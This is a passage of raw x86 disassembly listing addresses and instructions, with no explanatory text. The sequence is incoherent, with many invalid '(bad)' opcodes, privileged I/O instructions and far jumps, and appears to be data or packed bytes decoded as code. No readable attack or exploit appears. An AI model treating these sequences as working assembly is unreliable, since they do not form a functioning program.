  40be73:	ret    0xf856
  40be76:	gs loop 0x40bef5
  40be79:	jno    0x40beab
  40be7b:	retf   0x3571
  40be7e:	jmp    0x262f56c
  40be83:	iret   
  40be84:	fsub   st,st(7)
  40be86:	xchg   edi,eax
  40be87:	clc    
  40be88:	test   DWORD PTR [ecx-0x19],edi
  40be8b:	push   esp
  40be8c:	bound  esi,QWORD PTR [edx+0x4917ce23]
  40be92:	retf   0xbb3a
  40be95:	ret    
  40be96:	xlat   BYTE PTR ds:[ebx]
  40be97:	(bad)  
  40be98:	call   0x812597fc
  40be9d:	xor    BYTE PTR [edi+ecx*4+0x52],0xc
  40bea2:	test   al,0xa4
  40bea4:	cmp    esi,eax
  40bea6:	clc    
  40bea7:	ja     0x40bf05
  40bea9:	pop    ecx
  40beaa:	in     eax,0x68
  40beac:	enter  0x2a41,0x5d
  40beb0:	ret    
  40beb1:	mov    eax,0x7a166c03
  40beb6:	inc    eax
  40beb7:	clc    
  40beb8:	or     DWORD PTR [edi],edx
  40beba:	dec    eax
  40bebb:	mov    es,edx
  40bebd:	pop    ds
  40bebe:	sub    DWORD PTR [edi],ecx
  40bec0:	pop    ecx
  40bec1:	neg    DWORD PTR [eax-0x76]
  40bec4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40bec6:	(bad)  
  40bec7:	lods   al,BYTE PTR ds:[esi]
  40bec8:	push   ebp
  40bec9:	lods   eax,DWORD PTR ds:[esi]
  40beca:	cdq    
  40becb:	icebp  
  40becc:	pop    ebp
  40becd:	fld    TBYTE PTR [edi+0x549b66fa]
  40bed3:	sub    eax,0x8dd0bcac
  40bed8:	shl    BYTE PTR [ebp-0x7a],1
  40bedb:	fiadd  DWORD PTR ds:0x7973eb21
  40bee1:	jae    0x40be8c
  40bee3:	or     eax,0x400977c6
  40bee8:	and    BYTE PTR [ebp+0x747f4989],ch
  40beee:	retf   0xbdc7
  40bef1:	jbe    0x40bf1d
  40bef3:	mov    esp,0x9e7075b1
  40bef8:	test   BYTE PTR [ebx+0x4c],0xd7
  40befc:	jle    0x40bee5
  40befe:	rol    dl,0xda
  40bf01:	sub    BYTE PTR [ebp-0x217a6f2e],0xc3
  40bf08:	shr    DWORD PTR [ecx+0x69],1
  40bf0b:	(bad)  
  40bf0c:	xor    edi,DWORD PTR [esi]
  40bf0e:	jno    0x40bf22
  40bf10:	jb     0x40bf59
  40bf12:	rcl    ecx,cl
  40bf14:	stos   BYTE PTR es:[edi],al
  40bf15:	(bad)  [ebp-0x20]
  40bf18:	ja     0x40bf31
  40bf1a:	pop    DWORD PTR [eax-0x70]
  40bf1d:	jb     0x40beca
  40bf1f:	inc    edx
  40bf20:	sbb    DWORD PTR [ebx],0x8ad8a68a
  40bf26:	fld1   
  40bf28:	out    0x73,eax
  40bf2a:	in     al,0x76
  40bf2c:	test   BYTE PTR [eax-0x4e6aa5b4],ah
  40bf32:	imul   ebx,DWORD PTR [edx-0x10851aad],0x75
  40bf39:	xchg   BYTE PTR [edi+0x78f94d49],bh
  40bf3f:	stos   DWORD PTR es:[edi],eax
  40bf40:	aad    0xaa
  40bf42:	retf   0xfaad
  40bf45:	add    DWORD PTR [ecx-0x7],edi
  40bf48:	jno    0x40bf49
  40bf4a:	nop
  40bf4b:	in     eax,dx
  40bf4c:	cmp    eax,0xc2bf93f2
  40bf51:	inc    ecx
  40bf52:	inc    ebp
  40bf53:	das    
  40bf54:	mov    ch,0x4f
  40bf56:	sub    bl,dl
  40bf58:	jl     0x40bfa4
  40bf5a:	adc    DWORD PTR [eax-0x626eb496],esi
  40bf60:	mov    ch,BYTE PTR [ecx+0x6af7f580]
  40bf66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf67:	lds    ebp,FWORD PTR [ebp-0x2]
  40bf6a:	lahf   
  40bf6b:	push   ss
  40bf6c:	sub    DWORD PTR [edi],ebp
  40bf6e:	sub    eax,0xbd5f3b4
  40bf73:	sub    BYTE PTR [edx-0x75],0x15
  40bf77:	push   ebx
  40bf78:	into   
  40bf79:	dec    edi
  40bf7a:	jmp    0x13bc40ba
  40bf7f:	dec    ebp
  40bf80:	imul   esp,DWORD PTR [edi],0xcae14a89
  40bf86:	ins    BYTE PTR es:[edi],dx
  40bf87:	jo     0x40bfa2
  40bf89:	push   esp
  40bf8a:	dec    ebp
  40bf8b:	push   cs
  40bf8c:	imul   eax,DWORD PTR [ebx],0xffffffe9
  40bf8f:	mov    eax,0xeb5ac620
  40bf94:	test   al,0xdf
  40bf96:	pop    esp
  40bf97:	push   edi
  40bf98:	fild   QWORD PTR [esi]
  40bf9a:	xchg   ecx,eax
  40bf9b:	lea    ecx,[ebx-0x57ab775e]
  40bfa1:	cdq    
  40bfa2:	adc    dh,dh
  40bfa4:	imul   edx,DWORD PTR [esi],0xffffffdc
  40bfa7:	into   
  40bfa8:	cld    
  40bfa9:	mov    edi,0x9a3f88f5
  40bfae:	inc    ebp
  40bfaf:	mov    ebp,0x6f3b22b0
  40bfb4:	jecxz  0x40bf7d
  40bfb6:	nop
  40bfb7:	enter  0xfd6,0xad
  40bfbb:	jg     0x40bf96
  40bfbd:	fdiv   QWORD PTR [eax+0x1e070dc3]
  40bfc3:	je     0x40bfb4
  40bfc5:	pop    es
  40bfc6:	ret    0xd0d0
  40bfc9:	fld    DWORD PTR ss:[ebp-0x35]
  40bfcd:	ds call 0xbf13:0xa538c82
  40bfd5:	pop    edx
  40bfd6:	mov    esi,0x992b9494
  40bfdb:	je     0x40bfd3
  40bfdd:	jno    0x40c010
  40bfdf:	dec    esi
  40bfe0:	and    ah,BYTE PTR [esi+eiz*4]
  40bfe3:	fadd   st(2),st
  40bfe5:	fdivr  QWORD PTR [esi-0x151b8675]
  40bfeb:	lods   al,BYTE PTR ds:[esi]
  40bfec:	jecxz  0x40bfe4
  40bfee:	jne    0x40bfbe
  40bff0:	fst    st(0)
  40bff2:	jecxz  0x40bfd1
  40bff4:	xor    bl,BYTE PTR [esp+ebx*4-0x4]
  40bff8:	sbb    al,0xf9
  40bffa:	mov    eax,0x3dedf5c1
  40bfff:	out    dx,eax
  40c000:	and    eax,0x3b718da7
  40c005:	inc    ebp
  40c006:	adc    ch,BYTE PTR [ebp+0x19540f92]
  40c00c:	(bad)  
  40c00e:	mov    ah,BYTE PTR [ebx-0x538b33e5]
  40c014:	add    DWORD PTR [ebx+0x21],edx
  40c017:	aaa    
  40c018:	cld    
  40c019:	dec    ebp
  40c01a:	push   eax
  40c01b:	inc    edx
  40c01c:	cli    
  40c01d:	pop    esp
  40c01e:	mov    esi,0xb42f3294
  40c023:	imul   ebx,DWORD PTR [ebx-0x2b],0xe3897c18
  40c02a:	enter  0xbea,0x8
  40c02e:	push   es
  40c02f:	mov    ecx,0x895953d2
  40c034:	out    0x2a,al
  40c036:	ds push es
  40c038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c039:	and    DWORD PTR [ecx-0x580d0558],0xfffffffb
  40c040:	xchg   edx,eax
  40c041:	mov    WORD PTR [edx],es
  40c043:	leave  
  40c044:	jbe    0x40c0b7
  40c046:	cli    
  40c047:	sub    ch,BYTE PTR [esi+ebx*1-0x7b]
  40c04b:	test   esp,edi
  40c04d:	dec    esi
  40c04e:	jae    0x40c038
  40c050:	xchg   ebp,eax
  40c051:	scas   al,BYTE PTR es:[edi]
  40c052:	adc    BYTE PTR [ebx+ecx*1+0x2f3b2f99],bl
  40c059:	xchg   BYTE PTR [eax-0x532f916f],ch
  40c05f:	mov    WORD PTR [ecx],?
  40c061:	neg    DWORD PTR [edi]
  40c063:	shr    BYTE PTR [edx+0x549cf59a],1
  40c069:	cmp    ebp,0xffffff93
  40c06c:	pushf  
  40c06d:	xor    edi,DWORD PTR [edx-0x42044617]
  40c073:	sbb    BYTE PTR [edx+0x18],dh
  40c076:	sbb    esp,DWORD PTR [ecx]
  40c078:	das    
  40c079:	retf   0xf5ad
  40c07c:	call   0x75c14c29
  40c081:	test   al,0xc6
  40c083:	jbe    0x40c0e5
  40c085:	sti    
  40c086:	sbb    DWORD PTR [edi-0x3aa6b0e2],eax
  40c08c:	cmc    
  40c08d:	call   DWORD PTR [ecx-0x460c3086]
  40c093:	scas   eax,DWORD PTR es:[edi]
  40c094:	ins    BYTE PTR es:[edi],dx
  40c095:	or     al,0xb
  40c097:	pop    ds
  40c098:	jmp    0x3598a7ec
  40c09d:	and    eax,0x9fb885f
  40c0a2:	sbb    esp,DWORD PTR [ecx]
  40c0a4:	add    eax,0x771863bf
  40c0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0aa:	ss leave 
  40c0ac:	and    eax,0x6ec0590f
  40c0b1:	adc    BYTE PTR [eax+0x38],0x6c
  40c0b5:	jae    0x40c094
  40c0b7:	popa   
  40c0b8:	ret    
  40c0b9:	mov    ds:0xe6ea30a1,eax
  40c0be:	fsubrp st(4),st
  40c0c0:	shl    dh,cl
  40c0c2:	stos   DWORD PTR es:[edi],eax
  40c0c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0c4:	push   esi
  40c0c5:	test   BYTE PTR [esi],bl
  40c0c7:	jae    0x40c114
  40c0c9:	enter  0xe6b1,0x73
  40c0cd:	repnz shl BYTE PTR [eax],0x7a
  40c0d1:	add    eax,0xc10dc66d
  40c0d6:	cdq    
  40c0d7:	sub    al,0xf6
  40c0d9:	lods   eax,DWORD PTR ds:[esi]
  40c0da:	and    DWORD PTR [ecx],ecx
  40c0dc:	adc    ch,BYTE PTR [ebp*4-0x768f9c73]
  40c0e3:	jl     0x40c14f
  40c0e5:	mov    ds:0x61c8342f,eax
  40c0ea:	div    DWORD PTR [ebp-0x20f4eca7]
  40c0f0:	out    0x50,al
  40c0f2:	mov    edi,0x859182b6
  40c0f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0f8:	pushf  
  40c0f9:	(bad)  
  40c0fa:	cmc    
  40c0fb:	jle    0x40c0ec
  40c0fd:	dec    edi
  40c0fe:	dec    ecx
  40c0ff:	ds stos DWORD PTR es:[edi],eax
  40c101:	(bad)  
  40c102:	aam    0x7
  40c104:	sub    bl,BYTE PTR [esi+ecx*8+0x7a5527d9]
  40c10b:	cmp    BYTE PTR [edi+0x7f],0x91
  40c10f:	cmc    
  40c110:	pop    ecx
  40c111:	ds adc ah,ch
  40c114:	(bad)  
  40c115:	jne    0x40c145
  40c117:	mov    dh,0xf6
  40c119:	(bad)  
  40c11a:	into   
  40c11b:	adc    DWORD PTR ds:0xc2db87f2,ecx
  40c121:	jne    0x40c0f5
  40c123:	dec    esp
  40c124:	sahf   
  40c125:	iret   
  40c126:	jmp    0x40c120
  40c128:	es jmp 0x40c0f8
  40c12b:	or     BYTE PTR [ebx-0x73],bl
  40c12e:	(bad)  [edi]
  40c130:	in     eax,dx
  40c131:	rol    ebx,cl
  40c133:	sbb    eax,0x20c0ee42
  40c138:	xor    DWORD PTR [esi-0x1c4c8334],ecx
  40c13e:	(bad)  
  40c13f:	aaa    
  40c140:	jae    0x40c10a
  40c142:	out    dx,eax
  40c143:	mov    WORD PTR [ebx+ecx*4-0x6f],ds
  40c147:	in     al,0x46
  40c149:	mov    dl,0x86
  40c14b:	ss in  eax,0xf4
  40c14e:	xchg   ebx,eax
  40c14f:	lds    esp,FWORD PTR [edi]
  40c151:	ret    
  40c152:	jae    0x40c15f
  40c154:	js     0x40c17c
  40c156:	jb     0x40c0ee
  40c158:	pop    edi
  40c159:	rcr    DWORD PTR fs:[esi],0x34
  40c15d:	iret   
  40c15e:	and    eax,0x43e9bb39
  40c163:	or     DWORD PTR [ebx],ecx
  40c165:	xor    esp,DWORD PTR [esi-0x43]
  40c168:	and    bl,BYTE PTR [ecx-0x880a796]
  40c16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c16f:	jge    0x40c11b
  40c171:	scas   eax,DWORD PTR es:[edi]
  40c172:	retf   
  40c173:	add    DWORD PTR [eax-0x3d],ecx
  40c176:	jl     0x40c185
  40c178:	push   cs
  40c179:	scas   eax,DWORD PTR es:[edi]
  40c17a:	js     0x40c15d
  40c17c:	fs sub dh,al
  40c17f:	inc    edx
  40c180:	loopne 0x40c128
  40c182:	repnz pop es
  40c184:	sbb    eax,DWORD PTR [edi+edi*4+0x6f]
  40c188:	jle    0x40c12f
  40c18a:	jbe    0x40c126
  40c18c:	and    ch,BYTE PTR [eax-0x5]
  40c18f:	sbb    BYTE PTR [ecx],cl
  40c191:	lods   eax,DWORD PTR ds:[esi]
  40c192:	mov    ebx,0x15badabd
  40c197:	(bad)  
  40c198:	out    dx,eax
  40c199:	imul   eax,esi,0x27
  40c19c:	ins    BYTE PTR es:[edi],dx
  40c19d:	gs in  al,0x13
  40c1a0:	adc    al,0xc3
  40c1a2:	call   edx
  40c1a4:	xor    ebx,DWORD PTR [esi+ecx*1]
  40c1a7:	mov    dl,0xcc
  40c1a9:	imul   ecx,DWORD PTR [ebp-0x587795d4],0xffffff89
  40c1b0:	or     al,BYTE PTR [edi+0x19]
  40c1b3:	repnz pop esi
  40c1b5:	nop
  40c1b6:	sub    BYTE PTR [eax-0x6e],al
  40c1b9:	leave  
  40c1ba:	inc    esi
  40c1bb:	das    
  40c1bc:	loop   0x40c15f
  40c1be:	add    edx,eax
  40c1c0:	mov    ebp,0xc041c999
  40c1c5:	iret   
  40c1c6:	pop    esi
  40c1c7:	ins    DWORD PTR es:[edi],dx
  40c1c8:	repnz xor bl,BYTE PTR [eax+0x24]
  40c1cc:	shl    DWORD PTR [ebx+0x44e33e4b],0xe0
  40c1d3:	jne    0x40c189
  40c1d5:	sbb    DWORD PTR [ebx+edx*1-0x4a],0x2
  40c1da:	adc    edx,esp
  40c1dc:	daa    
  40c1dd:	popf   
  40c1de:	ret    
  40c1df:	aam    0x5d
  40c1e1:	in     al,0xfc
  40c1e3:	cli    
  40c1e4:	push   0xffffffb0
  40c1e6:	test   eax,0xf188b85a
  40c1eb:	fisub  DWORD PTR [ecx-0x5a]
  40c1ee:	jecxz  0x40c197
  40c1f0:	or     ch,bl
  40c1f2:	cmp    ecx,DWORD PTR [ecx-0x14]
  40c1f5:	add    eax,0x6490ba88
  40c1fa:	mov    bl,0xb1
  40c1fc:	cdq    
  40c1fd:	dec    esi
  40c1fe:	jns    0x40c1d6
  40c200:	sub    eax,0xc0aae16a
  40c205:	pop    eax
  40c206:	mov    al,0xef
  40c208:	repnz adc eax,0x934705d6
  40c20e:	jnp    0x40c1fe
  40c210:	leave  
  40c211:	push   esp
  40c212:	sub    DWORD PTR [edx+esi*4],ebp
  40c215:	sbb    edx,0xffffffc2
  40c218:	sbb    BYTE PTR [esi],0x8c
  40c21b:	stos   BYTE PTR es:[edi],al
  40c21c:	mov    ds:0x55eafd85,al
  40c221:	push   es
  40c222:	(bad)
  40c226:	push   ds
  40c227:	shr    DWORD PTR [eax+ebp*2],0xb1
  40c22b:	dec    ecx
  40c22c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c22d:	mov    al,0x17
  40c22f:	xchg   esp,eax
  40c230:	scas   eax,DWORD PTR es:[edi]
  40c231:	mov    ds:0x89709bcb,eax
  40c236:	pop    edi
  40c237:	iret   
  40c238:	fmulp  st(3),st
  40c23a:	in     eax,0xf0
  40c23c:	mov    al,0x8a
  40c23e:	fnstcw WORD PTR [esi+0x20]
  40c241:	ror    ecx,0xf0
  40c244:	adc    DWORD PTR ds:[di],edi
  40c248:	outs   dx,BYTE PTR ds:[esi]
  40c249:	xchg   ecx,eax
  40c24a:	mov    eax,0x5ef55d6a
  40c24f:	ss push 0xfffffff2
  40c252:	stos   BYTE PTR es:[edi],al
  40c253:	add    DWORD PTR [edi+edi*2-0x49568dba],eax
  40c25a:	out    dx,al
  40c25b:	or     ebx,DWORD PTR [eax+0x1c]
  40c25e:	push   eax
  40c25f:	js     0x40c2c9
  40c261:	dec    esp
  40c262:	cmp    eax,0x9264c9c3
  40c267:	mov    al,BYTE PTR ds:0x6df51022
  40c26d:	sub    BYTE PTR [ebp+0x5e3edc56],bl
  40c273:	enter  0x1a6f,0x88
  40c277:	dec    esi
  40c278:	stos   DWORD PTR es:[edi],eax
  40c279:	je     0x40c277
  40c27b:	lods   al,BYTE PTR ds:[esi]
  40c27c:	cmp    BYTE PTR [edi+eax*4-0x42],dh
  40c280:	push   es
  40c281:	in     eax,0x1
  40c283:	jmp    0xb6b0:0xf348b7dc
  40c28a:	stos   DWORD PTR es:[edi],eax
  40c28b:	and    al,BYTE PTR [ebx]
  40c28d:	and    al,0x17
  40c28f:	nop
  40c290:	pop    esi
  40c291:	std    
  40c292:	dec    esp
  40c293:	pop    edx
  40c294:	sahf   
  40c295:	jmp    0x40c242
  40c297:	rol    edx,1
  40c299:	mov    ebx,DWORD PTR es:0x6afe31fb
  40c2a0:	push   0x14
  40c2a2:	pop    ebx
  40c2a3:	repnz mov bh,BYTE PTR [edx]
  40c2a6:	call   0x2eea:0x30779b22
  40c2ad:	push   esp
  40c2ae:	jecxz  0x40c2b1
  40c2b0:	dec    ebx
  40c2b1:	cmp    esi,edx
  40c2b3:	ret    0x4196
  40c2b6:	sbb    ecx,eax
  40c2b8:	cmp    eax,0xaa0cfedd
  40c2bd:	ror    al,1
  40c2bf:	cmp    al,0xa4
  40c2c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c2:	repnz in eax,dx
  40c2c4:	or     al,0xc3
  40c2c6:	dec    edx
  40c2c7:	imul   ebp,DWORD PTR [edx-0x2adba5f3],0x637a2508
  40c2d1:	sub    cl,BYTE PTR [ecx]
  40c2d3:	dec    esp
  40c2d4:	or     eax,0xb824f152
  40c2d9:	cmp    ebx,DWORD PTR ds:0x5c7990dc
  40c2df:	dec    edx
  40c2e0:	mov    eax,DWORD PTR [ecx+0x4937ecf9]
  40c2e6:	cmp    dh,BYTE PTR [esi+0x22225d7]
  40c2ec:	in     al,0x19
  40c2ee:	in     al,dx
  40c2ef:	cld    
  40c2f0:	fbstp  TBYTE PTR [ebx-0x3f]
  40c2f3:	mov    bh,0x34
  40c2f5:	hlt    
  40c2f6:	jae    0x40c31c
  40c2f8:	into   
  40c2f9:	jne    0x40c303
  40c2fb:	in     al,dx
  40c2fc:	jecxz  0x40c291
  40c2fe:	push   0x420221ab
  40c303:	repz inc ecx
  40c305:	cdq    
  40c306:	xor    al,0x8d
  40c308:	push   cs
  40c309:	imul   esi,ebx,0x9c13d0b6
  40c30f:	jbe    0x40c372
  40c311:	adc    eax,0x206b0d87
  40c316:	adc    cl,BYTE PTR ss:[edx]
  40c319:	xchg   ebp,eax
  40c31a:	push   ebx
  40c31b:	(bad)  
  40c31c:	xor    al,0x2e
  40c31e:	test   eax,0x2993e148
  40c323:	adc    al,al
  40c325:	stos   DWORD PTR es:[edi],eax
  40c326:	inc    ecx
  40c327:	adc    al,0x48
  40c329:	cld    
  40c32a:	pop    es
  40c32b:	mov    eax,ds:0x86a842f8
  40c330:	(bad)  
  40c331:	loope  0x40c2ba
  40c333:	mov    al,0x51
  40c335:	pop    ecx
  40c336:	pop    ss
  40c337:	push   edi
  40c338:	xchg   ebp,eax
  40c339:	(bad)  [eax+0x771d5f0a]
  40c33f:	lods   eax,DWORD PTR ds:[esi]
  40c340:	repz mov ds:0x77303489,eax
  40c346:	xor    dh,BYTE PTR [ebp-0x4a0cd601]
  40c34c:	repz fisubr DWORD PTR [ebp-0x2d1081a0]
  40c353:	push   ds
  40c354:	in     al,dx
  40c355:	(bad)  
  40c356:	js     0x40c37d
  40c358:	mov    cl,0x6c
  40c35a:	adc    eax,0x116e7b18
  40c35f:	jge    0x40c37b
  40c361:	test   eax,0x1554643e
  40c366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c367:	xchg   BYTE PTR [ecx-0x500131bd],cl
  40c36d:	push   esp
  40c36e:	mov    dh,BYTE PTR [ecx]
  40c370:	sti    
  40c371:	xchg   edx,eax
  40c372:	test   al,0x8
  40c374:	les    edi,FWORD PTR [edx+eiz*1]
  40c377:	dec    ecx
  40c378:	or     BYTE PTR [ecx+ecx*2-0x74],al
  40c37c:	ss mov ebx,0x533d7d1c
  40c382:	ins    BYTE PTR es:[edi],dx
  40c383:	jmp    0x40c3b9
  40c385:	sub    al,0x14
  40c387:	xchg   esp,eax
  40c388:	mov    esp,0xcd8ccadb
  40c38d:	fild   WORD PTR [ecx+0x6f]
  40c390:	and    DWORD PTR [edx],esp
  40c392:	in     eax,0x51
  40c394:	push   ebp
  40c395:	inc    ebp
  40c396:	ins    DWORD PTR es:[edi],dx
  40c397:	aam    0xab
  40c399:	mov    al,BYTE PTR [ebp+0x41]
  40c39c:	ins    BYTE PTR es:[edi],dx
  40c39d:	jno    0x40c357
  40c39f:	cmp    dh,bl
  40c3a1:	add    bh,al
  40c3a3:	adc    BYTE PTR [ebx+eiz*1],0xc7
  40c3a7:	lock lods al,BYTE PTR ds:[esi]
  40c3a9:	dec    ecx
  40c3aa:	std    
  40c3ab:	pop    ecx
  40c3ac:	dec    edi
  40c3ad:	mov    ecx,0xc7cd83a4
  40c3b2:	push   ss
  40c3b3:	or     al,BYTE PTR [ebp+ebx*1-0x50b41cbb]
  40c3ba:	jecxz  0x40c3ea
  40c3bc:	icebp  
  40c3bd:	mov    ds:0xa81ebba4,al
  40c3c2:	mov    ebx,ss
  40c3c4:	sbb    ebx,esp
  40c3c6:	clc    
  40c3c7:	push   ebx
  40c3c8:	out    dx,al
  40c3c9:	push   ebp
  40c3ca:	in     al,dx
  40c3cb:	push   esp
  40c3cc:	xlat   BYTE PTR ds:[ebx]
  40c3cd:	mov    bl,0x2e
  40c3cf:	cdq    
  40c3d0:	gs js  0x40c422
  40c3d3:	enter  0x8145,0xa0
  40c3d7:	mov    al,0xe0
  40c3d9:	push   edi
  40c3da:	bound  esi,QWORD PTR [ecx]
  40c3dc:	jecxz  0x40c3c6
  40c3de:	dec    ecx
  40c3df:	mov    DWORD PTR [edi],esp
  40c3e1:	fdivr  st,st(6)
  40c3e3:	test   bl,dl
  40c3e5:	push   eax
  40c3e6:	mov    al,0x16
  40c3e8:	push   ss
  40c3e9:	adc    esi,edx
  40c3eb:	popf   
  40c3ec:	sti    
  40c3ed:	outs   dx,BYTE PTR ds:[esi]
  40c3ee:	lods   eax,DWORD PTR ds:[esi]
  40c3ef:	jge    0x40c385
  40c3f1:	cmp    eax,0x2695edd8
  40c3f6:	test   al,0xac
  40c3f8:	inc    edx
  40c3f9:	adc    DWORD PTR ds:0x3021ba21,eax
  40c3ff:	inc    ebp
  40c400:	lods   al,BYTE PTR ds:[esi]
  40c401:	push   esi
  40c402:	adc    bh,al
  40c404:	add    BYTE PTR [edx+esi*4-0x4887f64f],al
  40c40b:	mov    ch,0x7e
  40c40d:	lods   eax,DWORD PTR ds:[esi]
  40c40e:	ret    
  40c40f:	loope  0x40c47f
  40c411:	xchg   edx,eax
  40c412:	ret    
  40c413:	test   DWORD PTR [ebx],ecx
  40c415:	push   ss
  40c416:	mov    edi,0xa16dcc8d
  40c41b:	popa   
  40c41c:	pop    es
  40c41d:	cli    
  40c41e:	es gs fs xor eax,0x3f95d44c
  40c426:	in     eax,dx
  40c427:	sub    eax,0x2061b807
  40c42c:	sbb    BYTE PTR [esp+ecx*1],ah
  40c42f:	sbb    BYTE PTR [esi],ah
  40c431:	xchg   ecx,eax
  40c432:	call   0xd166:0x68979e45
  40c439:	xor    edi,DWORD PTR ds:0x4a72c81a
  40c43f:	jo     0x40c44d
  40c441:	inc    edx
  40c442:	adc    cl,BYTE PTR [eax+0x4b9404fa]
  40c448:	test   eax,0x3b993683
  40c44d:	xor    esp,edi
  40c44f:	cmp    ch,BYTE PTR [ecx]
  40c451:	call   0xb90:0x38fd26b5
  40c458:	jno    0x40c408
  40c45a:	imul   edi,DWORD PTR [edi+0x6c],0x7efa3aff
  40c461:	pop    ecx
  40c462:	jl     0x40c490
  40c464:	jne    0x40c491
  40c466:	stos   BYTE PTR es:[edi],al
  40c467:	and    bh,al
  40c469:	jne    0x40c40a
  40c46b:	(bad)  
  40c46c:	outs   dx,BYTE PTR ds:[esi]
  40c46d:	dec    ecx
  40c46e:	repz mov ds:0x48d11216,eax
  40c474:	adc    ah,ch
  40c476:	mov    WORD PTR [edi-0x11e6e7a2],?
  40c47c:	cld    
  40c47d:	xchg   esi,eax
  40c47e:	imul   edi,DWORD PTR [ecx+ebp*2+0x71],0x19e429d4
  40c486:	lahf   
  40c487:	xor    ah,al
  40c489:	lahf   
  40c48a:	addr16 ret 0x5209
  40c48e:	iret   
  40c48f:	add    dl,bh
  40c491:	adc    DWORD PTR [ecx+ebx*2+0x5e],esi
  40c495:	or     eax,DWORD PTR [ebx+0x6a929e92]
  40c49b:	jno    0x40c41d
  40c49d:	das    
  40c49e:	data16 or dh,bh
  40c4a1:	imul   edi,DWORD PTR [edx-0x6eac2523],0xffffff9b
  40c4a8:	sub    eax,0x9c6f15c
  40c4ad:	cmp    eax,0x54caee6
  40c4b2:	push   edi
  40c4b3:	and    DWORD PTR [ebp-0x6b917263],edi
  40c4b9:	jg     0x40c486
  40c4bb:	and    ch,BYTE PTR [edx-0x3d]
  40c4be:	arpl   WORD PTR ds:0x44032262,bp
  40c4c4:	inc    edx
  40c4c5:	xor    ebx,ebp
  40c4c7:	not    DWORD PTR [ecx+ecx*1+0x36ac0e2]
  40c4ce:	popa   
  40c4cf:	icebp  
  40c4d0:	cmp    ah,BYTE PTR [edx]
  40c4d2:	cmp    edx,ecx
  40c4d4:	push   eax
  40c4d5:	and    al,cl
  40c4d7:	jns    0x40c4db
  40c4d9:	inc    esp
  40c4da:	pop    ds
  40c4db:	pop    ebx
  40c4dc:	shl    DWORD PTR [eax+edx*2-0x3],cl
  40c4e0:	outs   dx,DWORD PTR ds:[esi]
  40c4e1:	xchg   edi,eax
  40c4e2:	xchg   DWORD PTR [edi+edi*4-0x2e957c9b],ebp
  40c4e9:	les    edx,FWORD PTR [edx-0x1babd896]
  40c4ef:	arpl   WORD PTR [edi+0x2e270534],cx
  40c4f5:	jmp    0x40c47d
  40c4f7:	jbe    0x40c47c
  40c4f9:	inc    ebx
  40c4fa:	stos   BYTE PTR es:[edi],al
  40c4fb:	leave  
  40c4fc:	or     dl,ch
  40c4fe:	dec    eax
  40c4ff:	and    al,0x86
  40c501:	fcmovnb st,st(6)
  40c503:	mov    esi,0x3249e4f9
  40c508:	imul   ecx,DWORD PTR [esp+eiz*8],0xffffff91
  40c50c:	add    ecx,DWORD PTR [edx+eax*1-0x6f770a0f]
  40c513:	adc    eax,DWORD PTR [edx+0x4821faa8]
  40c519:	add    eax,DWORD PTR [esi-0x2e3c1c01]
  40c51f:	xor    dl,0xdb
  40c522:	into   
  40c523:	icebp  
  40c524:	lds    edx,FWORD PTR [ecx+0x48]
  40c527:	outs   dx,DWORD PTR ds:[esi]
  40c528:	cmc    
  40c529:	add    DWORD PTR [ebx+0x3d],0x6b
  40c52d:	fadd   QWORD PTR [ecx]
  40c52f:	xchg   ebx,eax
  40c530:	test   ch,ch
  40c532:	aas    
  40c533:	and    DWORD PTR [ecx-0x57],edi
  40c536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c537:	adc    cl,ch
  40c539:	dec    eax
  40c53a:	loope  0x40c55c
  40c53c:	inc    ebx
  40c53d:	mov    bl,cl
  40c53f:	sub    edi,eax
  40c541:	mov    cl,0x44
  40c543:	push   es
  40c544:	jno    0x40c510
  40c546:	push   esp
  40c548:	fistp  QWORD PTR [edx]
  40c54a:	(bad)  
  40c54b:	jp     0x40c564
  40c54d:	xchg   ecx,eax
  40c54e:	fimul  WORD PTR [edx]
  40c550:	jl     0x40c4f5
  40c552:	dec    ecx
  40c553:	mov    eax,0x33fa6be2
  40c558:	jp     0x40c5c9
  40c55a:	jo     0x40c540
  40c55c:	push   esp
  40c55d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c55e:	cdq    
  40c55f:	jge    0x40c54b
  40c561:	xor    cl,dh
  40c563:	adc    eax,esi
  40c565:	push   esp
  40c566:	mov    bh,0x68
  40c568:	cmp    al,0x2a
  40c56a:	outs   dx,DWORD PTR ds:[esi]
  40c56b:	or     dl,BYTE PTR [ebx]
  40c56d:	(bad)  
  40c56e:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40c570:	ficom  WORD PTR es:[ebx+0x7de6523d]
  40c577:	pusha  
  40c578:	out    0xa8,eax
  40c57a:	and    DWORD PTR [edx+0x196d6c7a],edi
  40c580:	(bad)  
  40c581:	(bad)  
  40c582:	(bad)  
  40c583:	fcmovnb st,st(7)
  40c585:	not    cl
  40c587:	xor    ch,BYTE PTR [ebp-0x1f]
  40c58a:	inc    edi
  40c58b:	(bad)  
  40c58c:	adc    dh,BYTE PTR ds:0x419044da
  40c592:	test   edi,0xec1e604
  40c598:	mov    bh,0x15
  40c59a:	and    ch,ch
  40c59c:	and    eax,0x7f36c45c
  40c5a1:	out    0x71,al
  40c5a3:	xchg   ebp,eax
  40c5a4:	ja     0x40c53f
  40c5a6:	shr    esi,0xb5
  40c5a9:	sbb    esi,ebp
  40c5ab:	retf   
  40c5ac:	or     eax,esi
  40c5ae:	hlt    
  40c5af:	and    al,0xe6
  40c5b1:	push   edx
  40c5b2:	ins    BYTE PTR es:[edi],dx
  40c5b3:	mov    esi,0x8e548489
  40c5b8:	sahf   
  40c5b9:	sbb    al,0xc1
  40c5bb:	pop    eax
  40c5bc:	jmp    0x177e214a
  40c5c1:	in     eax,0x8d
  40c5c3:	push   0xb13c05dd
  40c5c8:	in     al,dx
